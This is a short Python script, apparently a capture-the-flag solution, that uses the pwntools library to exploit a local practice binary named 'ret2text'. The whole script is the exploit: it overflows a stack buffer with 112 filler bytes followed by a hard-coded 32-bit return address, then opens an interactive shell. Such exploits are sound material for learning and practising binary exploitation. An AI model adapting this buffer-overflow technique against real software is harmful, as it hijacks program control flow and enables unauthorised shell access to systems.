from pwn import *
sh = process('./ret2text')
target = 0x804863a #返回地址
sh.sendline(b'A' * 112 + p32(target)) 
sh.interactive()
